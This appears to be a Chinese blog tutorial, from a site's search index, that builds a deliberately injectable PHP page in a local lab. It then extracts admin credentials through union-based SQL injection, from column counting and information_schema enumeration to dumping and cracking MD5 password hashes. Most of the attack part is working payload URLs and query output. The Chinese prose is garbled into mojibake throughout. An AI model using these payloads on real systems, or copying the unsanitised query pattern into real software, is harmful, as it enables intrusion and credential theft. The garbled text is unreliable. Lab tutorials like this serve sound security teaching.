injectionï¼‰ï¼Œç®€ç§°æ³¨å…¥æ”»å‡»ï¼Œæ˜¯å‘ç”ŸäºŽåº”ç”¨ç¨‹åºä¹‹æ•°æ®åº“å±‚çš„å®‰å…¨æ¼æ´žã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ˜¯åœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ä¹‹ä¸­æ³¨å…¥SQLæŒ‡ä»¤ï¼Œåœ¨è®¾è®¡ä¸è‰¯çš„ç¨‹åºå½“ä¸­å¿½ç•¥äº†æ£€æŸ¥ï¼Œé‚£ä¹ˆè¿™äº›æ³¨å…¥è¿›åŽ»çš„æŒ‡ä»¤å°±ä¼šè¢«æ•°æ®åº“æœåŠ¡å™¨è¯¯è®¤ä¸ºæ˜¯æ­£å¸¸çš„SQLæŒ‡ä»¤è€Œè¿è¡Œï¼Œå› æ­¤é­åˆ°ç ´åæˆ–æ˜¯å…¥ä¾µã€‚ï¼ˆå¼•ç”¨wikiï¼‰ sqlæ³¨å…¥å®žéªŒçŽ¯å¢ƒï¼š phpstudyé›†æˆçŽ¯å¢ƒ IDE:sublime text3 æ²¡æœ‰çš„è‡ªè¡Œç™¾åº¦ï¼ï¼ï¼ ç¼–å†™ä¸€ä¸ªæœ‰æ¼æ´žçš„PHPä»£ç é¦–å…ˆæˆ‘ä»¬éœ€è¦å¯åŠ¨mysqlï¼Œåˆ›å»ºä¸€ä¸ªæ•°æ®åº“å‘½åä¸ºsqlin,å¹¶ä¸”åˆ‡æ¢è¿‡åŽ» use sqlin12create database sqlin default character set utf8 collate utf8_general_ci;use sqlin; åˆ›å»ºadminè¡¨å’Œpageè¡¨ï¼š12345678mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255)); å‘adminã€pageè¡¨é‡Œé¢åˆ†åˆ«æ’å…¥æ•°æ®1234mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); ä¸Šé¢çš„efe6398127928f1b2e9ef3207fb82663æ˜¯32ä½çš„md5å€¼ï¼Œæ²¡åŠ å¯†ä¹‹å‰æ˜¯qweqwe ç„¶åŽæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹æ˜¯æ•°æ®æ˜¯å¦æ’å…¥æˆåŠŸï¼š12345678910111213141516mysql&gt; select * from admin;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | smelond | efe6398127928f1b2e9ef3207fb82663 || 2 | admin | efe6398127928f1b2e9ef3207fb82663 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from page;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com || 2 | test | smelond.com |+----+----------+---------------------+2 rows in set (0.00 sec) è§£é‡Šä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ•°æ®åº“ä¼šåˆåœ¨æ•°æ®åº“é‡Œé¢åˆ›å»ºäº†ä¸¤ä¸ªè¡¨ï¼Ÿä¸ºä»€ä¹ˆä¸æ˜¯ä¸€ä¸ªè¡¨ï¼ŸåŽŸå› æ˜¯å› ä¸ºï¼š åœ¨çœŸå®žçš„ç½‘ç«™æ¡ˆä¾‹ä¸­ï¼Œæ²¡æœ‰ç®¡ç†å‘˜ä¼šæŠŠæ‰€æœ‰çš„æ•°æ®éƒ½æ”¾åœ¨ä¸€ä¸ªè¡¨ä¸­ï¼Œè€Œæ˜¯å¤šä¸ªè¡¨ã€å¤šä¸ªæ•°æ®åº“(æ–¹ä¾¿ç®¡ç†)ã€‚ æ”¾åœ¨ä¸€ä¸ªè¡¨ä¸­æŸ¥è¯¢å¾ˆéº»çƒ¦ï¼Œæ¯”å¦‚æ–‡ç« ï¼Œç”¨æˆ·åï¼Œä¸€äº›ä¸ªäººä¿¡æ¯ç­‰ã€‚ è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šåŽŸå› ã€‚ã€‚ã€‚ ç¼–å†™phpä»£ç æ²¡å­¦è¿‡phpï¼Œä»£ç å†™çš„ä¸è¡Œï¼Œè·¯è¿‡çš„å¤§ç¥žå¯ä»¥å¸®å¿™çœ‹çœ‹1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//è¿žæŽ¥æ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql="select * from page where id=$id";//æŸ¥è¯¢ $re=mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data=mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ echo "æ–‡ç« idï¼š".$data['id']."&lt;hr /&gt;"; echo "æ–‡ç« æ ‡é¢˜ï¼š".$data['title']."&lt;hr /&gt;"; echo "æ–‡ç« å†…å®¹ï¼š".$data['content']."&lt;hr /&gt;"; echo "å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿žæŽ¥æ•°æ®åº“æ˜¯slqinï¼ŒæŸ¥è¯¢çš„æ•°æ®è¡¨æ—¶pageï¼Œå¹¶æ²¡æœ‰ç”¨åˆ°adminé‚£ä¸ªè¡¨ï¼Œå› ä¸ºç½‘é¡µæ˜¾ç¤ºçš„æ˜¯æ–‡ç« æˆ–ä¸€äº›å…¶ä»–çš„å†…å®¹ã€‚ å¼€å§‹æˆ‘ä»¬çš„è¡¨æ¼”æˆ‘åˆšåˆšå·²ç»å°†æˆ‘å†™çš„ä»£ç æ”¾åˆ°äº†phpstudyçš„WWWç›®å½•ä¸‹äº†æˆ‘çš„è·¯å¾„æ˜¯ï¼šD:\phpStudy\PHPTutorial\WWW\webpentest\mysql\index.phpçŽ°åœ¨å¼€å§‹è®¿é—®ç½‘ç«™1http://127.0.0.1/webpentest/mysql/index.php è®¿é—®è¿›å…¥ä¹‹åŽå¯èƒ½å°±æ˜¯ä¸€äº›æŠ¥é”™ä¿¡æ¯ï¼Œä¸ç®¡è¿™äº›ï¼Œå› ä¸ºé¡µé¢ä¸Šçš„å†…å®¹æ˜¯ä»Žæ•°æ®åº“é‡Œé¢è°ƒç”¨çš„ï¼Œç„¶åŽåœ¨index.phpåŽé¢åŠ ä¸Š?x=11http://127.0.0.1/webpentest/mysql/index?x=1 //?x=1æ„æ€æ˜¯ä»Žæ•°æ®åº“é‡Œé¢æ‰¾id=1çš„å†…å®¹ çŽ°åœ¨çœ‹çœ‹ï¼Œç½‘é¡µä¸Šé¢æ˜¯å¦æœ‰äº†æ­£å¸¸æ•°æ®åº“äº†å‘¢ ç®€å•çš„åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥å…ˆè¯•ç€åœ¨?x=1åŽé¢åŠ ä¸Šand 1=1ã€and 1=2 åŠ ä¸Šand 1=1ä¼šè¿”å›žæ­£å¸¸é¡µé¢ï¼Œå¦‚æžœå‡ºçŽ°å®‰å…¨ç‹—ä¹‹ç±»çš„ï¼ˆå®žæˆ˜ä¸­ï¼‰é”™è¯¯ï¼Œä»¥åŽå†è¯´ åŠ ä¸Šand 1=2è¿”å›žé¡µé¢é”™è¯¯ï¼Œå°±å¯èƒ½æœ‰æ³¨å…¥äº†ï¼Œå› ä¸ºé¡µé¢ä¸Šçš„å†…å®¹æ˜¯åˆ°æ•°æ®åº“é‡Œé¢æŸ¥è¯¢è¿”å›žç»“æžœçš„ åŠ ä¸Šand 1=2æ—¶ï¼Œçœ‹ä¸‹é¢è¯­å¥ï¼š12345678910mysql&gt; select * from page where id=1 and 1=1;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com |+----+----------+---------------------+1 row in set (0.00 sec) //æ­£å¸¸è¿”å›žmysql&gt; select * from page where id=1 and 1=2;Empty set (0.00 sec) //çœ‹å§ï¼Œæ²¡æœ‰è¿”å›ž,æ‰€ä»¥ç½‘é¡µä¸Šé¢æ²¡æœ‰å†…å®¹ åœ¨é¡µé¢åŽé¢åŠ ä¸Š and 1=2,æ²¡æœ‰æ­£å¸¸è¿”å›žç»“æžœï¼Œé‚£å½“ç„¶å°±æ˜¯æœ‰æ³¨å…¥äº†çœ‹åˆ°å½“å‰æ‰§è¡Œçš„è¯­å¥ä¸ºï¼šselect * from page where id=1 and 1=2 æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ order by number //åˆ¤æ–­å­—æ®µ union select 1,2,3â€¦ //å°†ä¸¤ä¸ªè¡¨åˆå¹¶ä¸€èµ·æŸ¥è¯¢ database() //æ•°æ®åº“å user() //æ•°æ®åº“ç”¨æˆ· version() //æ•°æ®åº“ç‰ˆæœ¬ @@version_compile_os //æ“ä½œç³»ç»Ÿ æ‹¿ä¸Šåˆšåˆšå†™çš„é¡µé¢æµ‹è¯•order by http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 5 //è¿”å›žé”™è¯¯ http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 2 //è¿”å›žæ­£å¸¸ http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 3 //è¿”å›žæ­£å¸¸ http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 4 //è¿”å›žé”™è¯¯å¥½äº†ï¼ŒçŽ°åœ¨å·²ç»åˆ¤æ–­å‡ºä¸€å…±æœ‰3ä¸ªå­—æ®µäº† æŽ¥ç€ union http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3åˆæœ‰äº†åŒå­¦é—®é“ï¼Œä¸ºå•¥å‰é¢è¦åŠ ä¸Šand 1=2 ï¼ŸåŽŸå› æ˜¯å› ä¸ºï¼šå…ˆè®©ç½‘é¡µæŠ¥é”™ï¼Œç„¶åŽè¿›è¡ŒunionåŽé¢çš„æŸ¥è¯¢ï¼Œè¿™æ ·åŽé¢æŸ¥è¯¢çš„å†…å®¹æ‰ä¼šæ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚ç½‘é¡µå·²ç»æ˜¾ç¤ºå‡ºäº†æˆ‘ä»¬æŸ¥è¯¢çš„1,2,3 å†æ¥æŸ¥è¯¢æ•°æ®åº“åï¼Œæ•°æ®åº“ç”¨æˆ·ï¼Œæ•°æ®åº“ç‰ˆæœ¬ http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version()çŽ°åœ¨å·²ç»èŽ·å–åˆ°äº†æ•°æ®åº“åï¼Œæ•°æ®åº“ç”¨æˆ·ï¼Œæ•°æ®åº“ç‰ˆæœ¬äº† ä¸€ä¸ªå°å°çš„æç¤ºï¼š mysql5.0ä»¥ä¸Šçš„æ•°æ®åº“è‡ªå¸¦ï¼šinformation_schema information_schemaæ•°æ®åº“å­˜å‚¨äº†mysqlä¸‹æ‰€æœ‰çš„æ•°æ®åº“ã€è¡¨åã€åˆ—åè¯·ä½ ä¸€å®šè®°ä½è¿™ä¸ªï¼Œè€Œä¸”çŽ°åœ¨åŸºæœ¬éƒ½æ˜¯mysql5.0ä»¥ä¸Šçš„æ•°æ®åº“äº† information_schemaè¡¨è¯¥æ€Žä¹ˆç”¨ï¼ŸçŽ°åœ¨æˆ‘ä»¬å·²ç»èŽ·å–åˆ°äº†æ•°æ®åº“åï¼šsqlinï¼›æ•°æ®åº“ç”¨æˆ·ï¼šrootï¼›æ•°æ®åº“ç‰ˆæœ¬ï¼š5.5.53åœ¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ä¸­â€.â€è¡¨ç¤ºä¸‹ä¸€çº§çš„æ„æ€ information_schema.schemata information_schemaæ•°æ®åº“é‡Œé¢çš„schemataè¡¨ï¼Œä»–é‡Œé¢å­˜å‚¨äº†æ‰€æœ‰æ•°æ®åº“åç§°ã€‚ information_schema.tables information_schemaæ•°æ®åº“é‡Œé¢çš„tablesè¡¨ï¼Œä»–é‡Œé¢å­˜å‚¨äº†æ‰€æœ‰æ•°æ®åº“ä¸‹çš„è¡¨åä¿¡æ¯ã€‚ information_schema.columnsï¼š information_schemaæ•°æ®åº“é‡Œé¢çš„columnsè¡¨ï¼Œä»–é‡Œé¢å­˜å‚¨äº†æ‰€æœ‰æ•°æ®åº“ä¸‹çš„åˆ—åä¿¡æ¯ã€‚ table_schema æ•°æ®è¡¨æ‰€å±žçš„æ•°æ®åº“å table_name è¡¨åç§° column_name åˆ—åç§° schema_name æ•°æ®åº“å èŽ·å–æ•°æ®åº“ä¸‹çš„è¡¨åä¿¡æ¯ç„¶åŽæˆ‘ä»¬çŽ°åœ¨æ¥è¯•ç€èŽ·å–sqlinæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨åä¿¡æ¯ï¼š12345http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1// limit 0,1è¡¨ç¤ºä»Ž0å¼€å§‹ï¼Œå–1ä¸ªï¼Œç„¶åŽæˆ‘ä»¬æ‹¿åˆ°äº†æ•°æ®åº“sqlinä¸‹çš„æ•°æ®è¡¨adminhttp://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1// limit 1,1è¡¨ç¤ºä»Ž1å¼€å§‹ï¼Œå–1ä¸ªï¼Œç„¶åŽæˆ‘ä»¬åˆæ‹¿åˆ°æ•°æ®åº“sqlinä¸‹çš„æ•°æ®åº“page åŒæ—¶å–å¤šä¸ªï¼šé¦–å…ˆæˆ‘ä»¬è¯•è¯•ï¼š12http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,table_name,3 from information_schema.tables where table_schema='sqlin' limit 0,2// è¿”å›žå†…å®¹å‘çŽ°ä¸¤ä¸ªéƒ½æ˜¯adminï¼Œæ˜¾ç„¶ï¼Œè¿™ç§limit 0,2çš„æ–¹æ³•æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå¹¶æ²¡æœ‰æ˜¾ç¤ºpageè¡¨ å†è¯•è¯•ï¼š1234http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),3 from information_schema.tables where table_schema='sqlin' limit 0,2// ä»Ž0å¼€å§‹ï¼Œå–ä¸¤ä¸ªï¼Œç¬¬äºŒä¸ªä¼šæ˜¾ç¤ºå‡ºæ¥adminï¼Œä¸ºäº†è®©ä»–æ˜¾ç¤ºpageï¼Œæ‰€ä»¥æˆ‘æžœæ–­çš„å°†table_nameæ”¹ä¸ºäº†// (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)// åœ¨è¿™ä¸ªé‡Œé¢ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„å¾ˆæ˜Žæ˜¾å°±åº”è¯¥æ˜¯pageï¼Œæ‰€ä»¥åŒæ—¶å°±å–å‡ºæ¥äº†ä¸¤ä¸ª æˆ‘ä»¬åœ¨æ•°æ®åº“é‡Œé¢ç®€å•çš„æµ‹è¯•ä¸€ä¸‹1234567891011121314151617181920212223mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| admin | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| page | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),2 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+-----------------------------------------------------------------------------------------+---+| table_name | (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1) | 2 |+------------+-----------------------------------------------------------------------------------------+---+| admin | page | 2 |+------------+-----------------------------------------------------------------------------------------+---+1 row in set (0.00 sec) çŽ°åœ¨æˆ‘ä»¬å·²ç»èŽ·å–åˆ°ä¸€ä¸‹å†…å®¹ï¼š ç½‘ç«™æ•°æ®åº“å: sqlin æ•°æ®åº“ç‰ˆæœ¬: 5.5.53 æ•°æ®åº“ç”¨æˆ·: root å½“å‰ç½‘ç«™æ•°æ®åº“ä¸‹çš„è¡¨å: åˆ†åˆ«ä¸ºadmin,page èŽ·å–æ•°æ®åº“ä¸‹çš„è¡¨åä¸‹çš„åˆ—åä¿¡æ¯ä¸Šé¢æˆ‘ä»¬å·²ç»èŽ·å–åˆ°äº†sqlinæ•°æ®åº“ï¼Œå¹¶ä¸”èŽ·å–åˆ°äº†sqlinæ•°æ®åº“ä¸‹é¢çš„adminè¡¨ï¼Œä»¥åŠpageè¡¨ä»Žè¡¨çš„åç§°å¯ä»¥çœ‹å‡ºï¼Œadminè¡¨è‚¯å®šæ˜¯å­˜å‚¨ç”¨æˆ·ç™»å½•è´¦æˆ·å’Œå¯†ç çš„ ç»§ç»­èŽ·å–adminè¡¨é‡Œé¢çš„åˆ—åä¿¡æ¯ï¼š123456http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 0,1// èŽ·å–åˆ°äº†idåˆ—åhttp://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 1,1// èŽ·å–åˆ°äº†useråˆ—åhttp://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 2,1// èŽ·å–åˆ°äº†passwordåˆ—å éœ€è¦çš„ä¸œè¥¿éƒ½å·²ç»èŽ·å–åˆ°äº†ï¼šç½‘ç«™æ•°æ®åº“ï¼šsqlinæ•°æ®åº“ä¸‹çš„è¡¨ï¼šadminï¼Œpageadminè¡¨ä¸‹çš„åˆ—åï¼šid,username,password è¿˜å·®æœ€åŽä¸€æ­¥ï¼ŒèŽ·å–username,passwordé‡Œé¢çš„å†…å®¹è¿™å°±ç®€å•äº†ï¼Œæ²¡æœ‰ä¹‹å‰é‚£ä¹ˆç¹çåªéœ€è¦æŸ¥è¯¢å³å¯ï¼š123http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select username,password,3 from adminsmelondefe6398127928f1b2e9ef3207fb82663 å¶ç„¶å‘çŽ°äº†ä¸€ä¸ªå¾ˆå¥½çŽ©çš„å‡½æ•°concat()concatå‡½æ•°ç”¨äºŽè¿žæŽ¥ä¸¤ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ï¼Œå½¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å¥½äº†ï¼ŒçŽ°åœ¨æœ‰åŒå­¦é—®ï¼Œè¿™ä¸ªå‡½æ•°åœ¨sqlæ³¨å…¥ä¸­æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿcmdé‡Œé¢æ‰“å¼€æˆ‘ä»¬çš„mysql æµ‹è¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼š12345678910111213141516171819202122mysql&gt; select concat(123,':::','qwe');+-------------------------+| concat(123,':::','qwe') |+-------------------------+| 123:::qwe |+-------------------------+1 row in set (0.00 sec)mysql&gt; select concat(123,'qwe');+-------------------+| concat(123,'qwe') |+-------------------+| 123qwe |+-------------------+1 row in set (0.00 sec)mysql&gt; select concat('ç”¨æˆ·åï¼š','smelond','å¯†ç ï¼š','qweqwe');+------------------------------------------------+| concat('ç”¨æˆ·åï¼š','smelond','å¯†ç ï¼š','qweqwe') |+------------------------------------------------+| ç”¨æˆ·åï¼šsmelondå¯†ç ï¼šqweqwe |+------------------------------------------------+1 row in set, 2 warnings (0.00 sec) çŽ°åœ¨å¥½åƒçŸ¥é“æœ‰å•¥ç”¨äº†ï¼Œå“ˆå“ˆï¼ï¼ï¼æ¯”å¦‚æˆ‘ä»¬åœ¨è¿›è¡Œsqlæ³¨å…¥æ—¶ï¼Œå‘çŽ°åªæœ‰ä¸€ä¸ªåœ°æ–¹æœ‰å›žæ˜¾ï¼Œä½†æ˜¯æƒ³åŒæ—¶æŸ¥è¯¢usernameï¼Œpasswordï¼Œç­‰å¤šä¸ªå†…å®¹ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨concat() å¥½äº†ï¼Œæˆ‘è¿˜æ˜¯æ‹¿ç€ä»£ç åŽ»è¯•è¯•å§ã€‚12345678http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat('&lt;br&gt;è´¦å·ï¼š',username,'&lt;br&gt;','å¯†ç ï¼š',password),2,3 from adminè¾“å‡ºç»“æžœï¼š // è´¦å·ï¼šsmelond // å¯†ç ï¼šefe6398127928f1b2e9ef3207fb82663http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat(username,'&gt;&gt;&gt;',password),2,3 from adminè¾“å‡ºç»“æžœï¼š // smelond&gt;&gt;&gt;efe6398127928f1b2e9ef3207fb82663 å½“ç„¶ä¸æ­¢ä¸Šé¢è¿™ä¸ªä¸€ç‚¹ç”¨æ³•å’¯ï¼Œè¿˜æœ‰ï¼š1http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,concat(table_name,':',(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)),3 from information_schema.tables where table_schema='sqlin' limit 0,1 è¿™å›žå¥½åƒæ²¡æ¯›ç—…äº†å§ï¼Œå“ˆå“ˆï¼Œemmmmmmmmmï¼ï¼ï¼ æœ€åŽï¼Œè®°å¾—æ‹¿ç€md5å€¼åŽ»è§£å¯†ã€‚ã€‚ã€‚ efe6398127928f1b2e9ef3207fb82663 == qweqwe]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
</search>
